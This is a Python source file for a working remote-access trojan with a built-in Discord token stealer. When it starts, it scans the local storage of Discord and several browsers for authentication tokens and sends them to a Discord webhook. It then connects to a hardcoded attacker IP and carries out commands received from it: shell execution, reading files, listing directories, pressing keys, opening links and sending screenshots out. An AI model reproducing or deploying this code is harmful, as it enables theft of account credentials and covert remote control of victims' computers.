import socket
import os
import ast
import ctypes
import re
import json
import webbrowser
import pyautogui
import tempfile
import random
from dotenv import load_dotenv
from urllib.request import Request, urlopen

s = socket.socket()

load_dotenv()

# START OF CONFIG

startup = False

ip = "54.39.98.2"
port = 8080

WEBHOOK_URL = os.getenv("D_WEBHOOK_URL")
PING = True

# END OF CONFIG

def reset():
    global s
    
    s = socket.socket()

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    
    message = '@everyone' if PING else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

main()

while True:

    try:
        incoming_message = s.recv(1024)
        incoming_message = incoming_message.decode()
        incoming_message = ast.literal_eval(incoming_message)

        if incoming_message[0] == "vfisd":
            end = str(['vfisd', "Unknown error occured."])

            if os.path.exists(incoming_message[1]):
                myDir = os.listdir(incoming_message[1])
                end = str(['vfisd', myDir])
            else:
                end = str(['vfisd', "Invalid directory provided."])

            end = end.encode()
            s.send(end)

        if incoming_message[0] == "smbwm":
            msgBox = ctypes.windll.user32.MessageBoxW(0, incoming_message[1], incoming_message[2], 4)
            response = "Null"

            if msgBox == 6: response = "Yes"
            if msgBox == 7: response = "No"
            if msgBox == 2: response = "Cancel"

            end = str(['smbwm', response])
            end = end.encode()

            s.send(end)

        if incoming_message[0] == "ewc":
            result = os.popen(incoming_message[1]).read()

            if not result:
                result = "Unknown error occured"

            end = str(['ewc', result])
            end = end.encode()

            s.send(end)
            
        if incoming_message[0] == "rtf":
            end = str(['rtf', "Unknown error occured."])
            
            if os.path.isfile(incoming_message[1]):
                with open(incoming_message[1], 'r') as f:
                    content = f.readlines()
                f.close()
                end = str(['rtf', content])
            else:
                end = str(['rtf', "Invalid path provided."])
                
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "ol":
            webbrowser.open(incoming_message[1])
            
            end = str(['ol', "Link executed in web browser."])
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "eh":
            pyautogui.hotkey(*incoming_message[1])
            end = str(['eh', "Hotkey executed"])
                
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "ecmdc":
            cmd = os.system(incoming_message[1])
            
            if cmd == 0:
                result = "Successfully executed command."
            else:
                result = "Failed to execute command."
            
            end = str(['ecmdc', result])
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "tss":
            end = str(['tss', "Unknown error occured."])
            
            screenshot = pyautogui.screenshot()
            screenshot.save(tempfile.gettempdir() + '/abc-' + str(random.randint(0, 1000)) + ".png")
            
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }
            
            payload = json.dumps({'files': screenshot})
            
            try:
                req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
                urlopen(req)
                end = str(['tss', "Successfully sent screenshot to discord."])
            except:
                end = str(['tss', "Error occured."])
            
            end = end.encode()
            s.send(end)
            
    except:
        try:
            s.connect((ip, port))
        except:
            reset()